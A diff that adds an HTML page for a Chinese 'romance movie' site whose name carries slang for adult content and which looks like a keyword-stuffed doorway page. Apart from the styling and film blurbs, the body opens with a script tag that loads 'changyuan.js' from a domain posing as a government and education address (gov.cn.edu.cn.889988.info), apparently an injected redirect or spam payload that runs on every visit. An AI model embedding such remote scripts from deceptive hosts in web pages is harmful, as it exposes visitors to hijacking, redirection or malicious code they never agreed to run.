@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网 · 社保片 | 每一帧都是心跳的社保·aiqingdianyingwangshebaopian.top</title>
+<meta name="description" content="爱情电影网·社保片（aiqingdianyingwangshebaopian.top）是一个以情感共鸣为核心的影视陪伴社区。我们相信好电影就像社保——平时感觉不到，却在最需要的时候给你安全感。提供治愈系片单、经典爱情档案、深夜情感专区与光影心情日记。">
+<meta name="keywords" content="爱情电影网, 社保片, aiqingdianyingwangshebaopian, 治愈系电影, 爱情片单, 情感共鸣, 光影陪伴, 影视社保">
+<style>
+/* ===== Day/Night Theme System ===== */
+:root {
+  /* Day Theme (default) */
+  --bg-primary: #fefcf9;
+  --bg-secondary: #fff8f0;
+  --bg-card: #ffffff;
+  --text-primary: #2d1b14;
+  --text-secondary: #6b5b4f;
+  --accent: #d94f70;
+  --accent-soft: #f4d9e0;
+  --border: #f0e0d8;
+  --glow: rgba(217, 79, 112, 0.1);
+  --shadow: rgba(45, 27, 20, 0.06);
+  --mood-happy: #fbbf77;
+  --mood-sad: #7ba7cc;
+  --mood-warm: #f4978e;
+  --mood-calm: #a8dadc;
+}
+
+[data-theme="night"] {
+  --bg-primary: #1a1525;
+  --bg-secondary: #241c35;
+  --bg-card: #2d2440;
+  --text-primary: #f0e6f0;
+  --text-secondary: #b0a0c0;
+  --accent: #e879a8;
+  --accent-soft: #4a2a45;
+  --border: #3a2f4e;
+  --glow: rgba(232, 121, 168, 0.15);
+  --shadow: rgba(0, 0, 0, 0.3);
+  --mood-happy: #e8a838;
+  --mood-sad: #5b8fbf;
+  --mood-warm: #d4726a;
+  --mood-calm: #6fb8c0;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  font-family: "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+  line-height: 1.8;
+  transition: background 0.6s ease, color 0.6s ease;
+  overflow-x: hidden;
+}
+
+a { color: inherit; text-decoration: none; }
+.container { max-width: 1100px; margin: 0 auto; padding: 0 1.5rem; }
+
+/* ===== Theme Toggle ===== */
+.theme-toggle {
+  position: fixed;
+  top: 1.5rem;
+  right: 1.5rem;
+  z-index: 1000;
+  width: 52px;
+  height: 52px;
+  border-radius: 50%;
+  border: 2px solid var(--border);
+  background: var(--bg-card);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.4rem;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 16px var(--shadow);
+}
+.theme-toggle:hover {
+  transform: scale(1.1) rotate(15deg);
+  border-color: var(--accent);
+}
+
+/* ===== Hero ===== */
+.hero {
+  min-height: 90vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  padding: 6rem 0 4rem;
+  text-align: center;
+}
+
+.hero::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: radial-gradient(ellipse 80% 60% at 50% 40%, var(--glow), transparent);
+  pointer-events: none;
+}
+
+.hero-content {
+  position: relative;
+  z-index: 1;
+  max-width: 700px;
+}
+
+.hero-icon {
+  font-size: 4rem;
+  margin-bottom: 1rem;
+  animation: heartbeat 2s ease-in-out infinite;
+}
+
+@keyframes heartbeat {
+  0%, 100% { transform: scale(1); }
+  15% { transform: scale(1.12); }
+  30% { transform: scale(1); }
+  45% { transform: scale(1.08); }
+  60% { transform: scale(1); }
+}
+
+.hero h1 {
+  font-size: clamp(2rem, 5vw, 3.5rem);
+  font-weight: 900;
+  line-height: 1.2;
+  margin-bottom: 1rem;
+  letter-spacing: -0.02em;
+}
+
+.hero h1 .highlight {
+  color: var(--accent);
+  position: relative;
+}
+
+.hero p {
+  font-size: 1.1rem;
+  color: var(--text-secondary);
+  margin-bottom: 2.5rem;
+  max-width: 520px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.hero-domain {
+  display: inline-block;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 0.6rem 1.2rem;
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  font-family: ui-monospace, "SF Mono", monospace;
+  margin-top: 1.5rem;
+}
+
+/* ===== Floating Hearts BG ===== */
+.hearts-bg {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  pointer-events: none;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.heart {
+  position: absolute;
+  bottom: -60px;
+  font-size: 1.2rem;
+  opacity: 0.15;
+  animation: floatUp linear infinite;
+}
+
+@keyframes floatUp {
+  0% { transform: translateY(0) rotate(0deg); opacity: 0.15; }
+  10% { opacity: 0.3; }
+  90% { opacity: 0.1; }
+  100% { transform: translateY(-110vh) rotate(360deg); opacity: 0; }
+}
+
+/* ===== Section ===== */
+.section {
+  padding: 5rem 0;
+  position: relative;
+  z-index: 1;
+}
+
+.section-header {
+  text-align: center;
+  margin-bottom: 3rem;
+}
+
+.section-header h2 {
+  font-size: 2rem;
+  font-weight: 800;
+  margin-bottom: 0.5rem;
+}
+
+.section-header p {
+  color: var(--text-secondary);
+  font-size: 0.95rem;
+}
+
+/* ===== Mood Cards (4 columns) ===== */
+.mood-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+  gap: 1.5rem;
+}
+
+.mood-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  padding: 2rem;
+  text-align: center;
+  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  position: relative;
+  overflow: hidden;
+}
+
+.mood-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 4px;
+  background: var(--mood-color, var(--accent));
+  opacity: 0;
+  transition: opacity 0.3s;
+}
+
+.mood-card:hover::before { opacity: 1; }
+
+.mood-card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 20px 40px var(--shadow);
+  border-color: var(--mood-color, var(--accent));
+}
+
+.mood-emoji {
+  font-size: 3rem;
+  margin-bottom: 1rem;
+  display: block;
+}
+
+.mood-card h3 {
+  font-size: 1.2rem;
+  margin-bottom: 0.5rem;
+}
+
+.mood-card p {
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  line-height: 1.6;
+}
+
+/* ===== Timeline ===== */
+.timeline-wrap {
+  max-width: 800px;
+  margin: 0 auto;
+  position: relative;
+  padding: 2rem 0;
+}
+
+.timeline-wrap::before {
+  content: '';
+  position: absolute;
+  left: 50%;
+  top: 0; bottom: 0;
+  width: 2px;
+  background: var(--border);
+  transform: translateX(-50%);
+}
+
+.timeline-block {
+  position: relative;
+  margin-bottom: 3rem;
+  width: 50%;
+  padding-right: 3rem;
+}
+
+.timeline-block:nth-child(even) {
+  margin-left: 50%;
+  padding-right: 0;
+  padding-left: 3rem;
+}
+
+.timeline-dot {
+  position: absolute;
+  top: 1.5rem;
+  right: -8px;
+  width: 16px;
+  height: 16px;
+  border-radius: 50%;
+  background: var(--accent);
+  border: 3px solid var(--bg-primary);
+  z-index: 2;
+}
+
+.timeline-block:nth-child(even) .timeline-dot {
+  right: auto;
+  left: -8px;
+}
+
+.timeline-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 1.5rem;
+  transition: all 0.3s ease;
+}
+
+.timeline-card:hover {
+  border-color: var(--accent);
+  box-shadow: 0 8px 24px var(--shadow);
+}
+
+.timeline-date {
+  font-size: 0.75rem;
+  color: var(--accent);
+  font-weight: 700;
+  letter-spacing: 0.05em;
+  margin-bottom: 0.3rem;
+}
+
+.timeline-card h3 {
+  font-size: 1.1rem;
+  margin-bottom: 0.5rem;
+}
+
+.timeline-card p {
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+}
+
+/* ===== Diary Grid ===== */
+.diary-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 1.5rem;
+}
+
+.diary-entry {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 1.8rem;
+  position: relative;
+}
+
+.diary-entry::before {
+  content: '"';
+  position: absolute;
+  top: 0.5rem;
+  left: 1rem;
+  font-size: 3rem;
+  color: var(--accent);
+  opacity: 0.2;
+  font-family: Georgia, serif;
+}
+
+.diary-date {
+  font-size: 0.75rem;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+}
+
+.diary-entry h4 {
+  font-size: 1rem;
+  margin-bottom: 0.5rem;
+}
+
+.diary-entry p {
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  font-style: italic;
+}
+
+/* ===== CTA Section ===== */
+.cta-section {
+  text-align: center;
+  padding: 5rem 0;
+  background: linear-gradient(135deg, var(--accent-soft), transparent);
+  border-radius: 30px;
+  margin: 3rem 0;
+}
+
+.cta-section h2 {
+  font-size: 2rem;
+  margin-bottom: 1rem;
+}
+
+.cta-section p {
+  color: var(--text-secondary);
+  margin-bottom: 2rem;
+  max-width: 500px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.btn-main {
+  display: inline-block;
+  background: var(--accent);
+  color: #fff;
+  padding: 1rem 2.5rem;
+  border-radius: 30px;
+  font-weight: 700;
+  font-size: 1rem;
+  transition: all 0.3s ease;
+  border: none;
+  cursor: pointer;
+}
+
+.btn-main:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 10px 30px var(--glow);
+}
+
+/* ===== Footer ===== */
+.footer {
+  background: var(--bg-secondary);
+  border-top: 1px solid var(--border);
+  padding: 4rem 0 2rem;
+  position: relative;
+  z-index: 1;
+}
+
+.footer-grid {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1fr 1fr;
+  gap: 3rem;
+  margin-bottom: 2rem;
+}
+
+.footer-brand .logo-text {
+  font-size: 1.5rem;
+  font-weight: 900;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+}
+
+.footer-brand p {
+  color: var(--text-secondary);
+  font-size: 0.85rem;
+}
+
+.footer-col h4 {
+  font-size: 0.9rem;
+  margin-bottom: 1rem;
+  color: var(--text-primary);
+}
+
+.footer-col ul { list-style: none; }
+.footer-col li { margin-bottom: 0.5rem; }
+.footer-col a {
+  color: var(--text-secondary);
+  font-size: 0.85rem;
+  transition: color 0.2s;
+}
+.footer-col a:hover { color: var(--accent); }
+
+.footer-bottom {
+  border-top: 1px solid var(--border);
+  padding-top: 1.5rem;
+  text-align: center;
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+}
+
+.footer-bottom a { color: var(--accent); }
+
+/* ===== Responsive ===== */
+@media (max-width: 768px) {
+  .hero { min-height: 70vh; padding: 4rem 0 2rem; }
+  .timeline-wrap::before { left: 20px; }
+  .timeline-block,
+  .timeline-block:nth-child(even) {
+    width: 100%;
+    margin-left: 0;
+    padding-left: 3.5rem;
+    padding-right: 0;
+  }
+  .timeline-dot,
+  .timeline-block:nth-child(even) .timeline-dot {
+    left: 12px;
+    right: auto;
+  }
+  .footer-grid {
+    grid-template-columns: 1fr 1fr;
+    gap: 2rem;
+  }
+  .theme-toggle {
+    top: 1rem;
+    right: 1rem;
+    width: 44px;
+    height: 44px;
+    font-size: 1.2rem;
+  }
+}
+
+@media (max-width: 480px) {
+  .footer-grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- Floating Hearts -->
+<div class="hearts-bg" id="heartsBg"></div>
+
+<!-- Theme Toggle -->
+<button class="theme-toggle" onclick="toggleTheme()" id="themeBtn" title="切换日/夜模式">🌙</button>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="container">
+    <div class="hero-content">
+      <div class="hero-icon">💗</div>
+      <h1>爱情电影网<span class="highlight">· 社保片</span></h1>
+      <p>每一帧都是心跳的社保。我们相信好电影就像社保——平时感觉不到，却在最需要的时候给你最踏实的安全感。</p>
+      <div class="hero-domain">aiqingdianyingwangshebaopian.top</div>
+    </div>
+  </div>
+</section>
+
+<!-- Mood Sections -->
+<section class="section" id="moods">
+  <div class="container">
+    <div class="section-header">
+      <h2>此刻，你是什么心情？</h2>
+      <p>选一种情绪，我们为你匹配最懂你的那部电影</p>
+    </div>
+    <div class="mood-grid">
+      <div class="mood-card" style="--mood-color: var(--mood-happy)">
+        <span class="mood-emoji">🌞</span>
+        <h3>阳光午后</h3>
+        <p>适合心情明朗的日子。轻快浪漫的喜剧与治愈系动画，让好心情延续一整天。</p>
+      </div>
+      <div class="mood-card" style="--mood-color: var(--mood-sad)">
+        <span class="mood-emoji">🌧️</span>
+        <h3>雨天独处</h3>
+        <p>窗外下雨，屋里放一部催泪佳作。允许自己被剧情打动，也是一种自我疗愈。</p>
+      </div>
+      <div class="mood-card" style="--mood-color: var(--mood-warm)">
+        <span class="mood-emoji">🕯️</span>
+        <h3>深夜思念</h3>
+        <p>万籁俱寂时的情感片专场。那些说不出口的话，让电影替你表达。</p>
+      </div>
+      <div class="mood-card" style="--mood-color: var(--mood-calm)">
+        <span class="mood-emoji">🌊</span>
+        <h3>平静放空</h3>
+        <p>不需要太强的剧情冲击，生活流电影与诗性纪录片，让心灵慢下来。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Timeline -->
+<section class="section" id="archive" style="background: var(--bg-secondary);">
+  <div class="container">
+    <div class="section-header">
+      <h2>经典爱情档案</h2>
+      <p>那些跨越时间的光影记忆，每一部都值得被重新看见</p>
+    </div>
+    <div class="timeline-wrap">
+      <div class="timeline-block">
+        <div class="timeline-dot"></div>
+        <div class="timeline-card">
+          <div class="timeline-date">1995 · 经典</div>
+          <h3>《情书》岩井俊二</h3>
+          <p>一封寄往天国的信，揭开了一段藏在记忆深处的双向暗恋。纯白世界里的初恋，是每个看过的人都忘不掉的心动。</p>
+        </div>
+      </div>
+      <div class="timeline-block">
+        <div class="timeline-dot"></div>
+        <div class="timeline-card">
+          <div class="timeline-date">2000 · 浪漫</div>
+          <h3>《花样年华》王家卫</h3>
+          <p>如果多一张船票，你会不会跟我走？旗袍与烟雾之间，是克制到极致的东方情感美学。</p>
+        </div>
+      </div>
+      <div class="timeline-block">
+        <div class="timeline-dot"></div>
+        <div class="timeline-card">
+          <div class="timeline-date">2016 · 治愈</div>
+          <h3>《你的名字》新海诚</h3>
+          <p>无论你在世界的哪个角落，我都会去找你。彗星划过天空的那一夜，两个灵魂交换了人生。</p>
+        </div>
+      </div>
+      <div class="timeline-block">
+        <div class="timeline-dot"></div>
+        <div class="timeline-card">
+          <div class="timeline-date">2019 · 温暖</div>
+          <h3>《婚姻故事》诺亚·鲍姆巴赫</h3>
+          <p>离婚不一定是因为不爱了，有时候恰恰是因为太爱了。一首《Being Alive》唱尽了亲密关系中的依恋与挣扎。</p>
+        </div>
+      </div>
+      <div class="timeline-block">
+        <div class="timeline-dot"></div>
+        <div class="timeline-card">
+          <div class="timeline-date">2022 · 心动</div>
+          <h3>《过往人生》席琳·宋</h3>
+          <p>In another life, I would have really liked just doing laundry and taxes with you. 一句话道尽了所有未完成的爱情。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Diary -->
+<section class="section" id="diary">
+  <div class="container">
+    <div class="section-header">
+      <h2>光影心情日记</h2>
+      <p>来自社区的情感观影记录，每一篇都是一次真诚的分享</p>
+    </div>
+    <div class="diary-grid">
+      <div class="diary-entry">
+        <div class="diary-date">2024.10.05</div>
+        <h4>看完《情书》，想起了高中同桌</h4>
+        <p>那个人的名字和"藤井树"一样，被我在课本上写了很多遍。有些感情不必说出口，藏在心里才是最美的样子。</p>
+      </div>
+      <div class="diary-entry">
+        <div class="diary-date">2024.10.08</div>
+        <h4>深夜重看《爱在黎明破晓前》</h4>
+        <p>凌晨两点，一个人看了两遍。如果那天在火车上没有搭话，人生会不会完全不同？但人生没有如果，只有此刻。</p>
+      </div>
+      <div class="diary-entry">
+        <div class="diary-date">2024.10.12</div>
+        <h4>《过往人生》让我哭到隐形眼镜滑片</h4>
+        <p>不是悲剧，却比悲剧更让人心碎。原来最好的爱情，是在另一个平行宇宙里"如果"。</p>
+      </div>
+      <div class="diary-entry">
+        <div class="diary-date">2024.10.15</div>
+        <h4>和妈妈一起看《你好，李焕英》</h4>
+        <p>她笑着笑着就哭了，说想她的妈妈了。那一刻我突然明白，所有爱情片的终点都是亲情。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section class="section">
+  <div class="container">
+    <div class="cta-section">
+      <h2>今天，让电影陪你一会儿 🎬</h2>
+      <p>爱情电影网·社保片不只是一个片单网站，更是一个温暖的陪伴空间。无论你现在是什么心情，总有一部电影在等你。</p>
+      <button class="btn-main" onclick="window.scrollTo({top:0,behavior:'smooth'})">回到顶部 · 重新选心情</button>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="container">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <div class="logo-text">💗 爱情电影网 · 社保片</div>
+        <p>每一帧都是心跳的社保。用心推荐每一部值得被看见的爱情电影。</p>
+        <p style="margin-top:0.5rem;font-size:0.8rem;">aiqingdianyingwangshebaopian.top</p>
+      </div>
+      <div class="footer-col">
+        <h4>心情专区</h4>
+        <ul>
+          <li><a href="#moods">阳光午后</a></li>
+          <li><a href="#moods">雨天独处</a></li>
+          <li><a href="#moods">深夜思念</a></li>
+          <li><a href="#moods">平静放空</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>档案导航</h4>
+        <ul>
+          <li><a href="#archive">经典爱情</a></li>
+          <li><a href="#diary">心情日记</a></li>
+          <li><a href="#">片单推荐</a></li>
+          <li><a href="#">每周更新</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#">平台理念</a></li>
+          <li><a href="#">投稿须知</a></li>
+          <li><a href="#">友情链接</a></li>
+          <li><a href="#">联系方式</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 爱情电影网·社保片 (aiqingdianyingwangshebaopian.top) · 用心做有温度的影视推荐</p>
+      <p style="margin-top:0.3rem;">GitHub Pages: <a href="https://aiqingdianyingwangshebaopian-top.github.io">https://aiqingdianyingwangshebaopian-top.github.io</a></p>
+    </div>
+  </div>
+</footer>
+
+<script>
+// Theme Toggle
+function toggleTheme() {
+  const html = document.documentElement;
+  const btn = document.getElementById('themeBtn');
+  if (html.getAttribute('data-theme') === 'night') {
+    html.removeAttribute('data-theme');
+    btn.textContent = '🌙';
+  } else {
+    html.setAttribute('data-theme', 'night');
+    btn.textContent = '☀️';
+  }
+}
+
+// Floating Hearts
+function createHeart() {
+  const hearts = ['💗', '💕', '♥️', '💖', '🩷', '💘'];
+  const heart = document.createElement('div');
+  heart.className = 'heart';
+  heart.textContent = hearts[Math.floor(Math.random() * hearts.length)];
+  heart.style.left = Math.random() * 100 + '%';
+  heart.style.animationDuration = (Math.random() * 8 + 8) + 's';
+  heart.style.fontSize = (Math.random() * 1 + 0.8) + 'rem';
+  document.getElementById('heartsBg').appendChild(heart);
+  setTimeout(() => heart.remove(), 16000);
+}
+
+setInterval(createHeart, 2500);
+
+// Smooth scroll for nav
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', function(e) {
+    e.preventDefault();
+    const target = document.querySelector(this.getAttribute('href'));
+    if (target) {
+      target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+  });
+});
+</script>
+
+</body>
+</html>
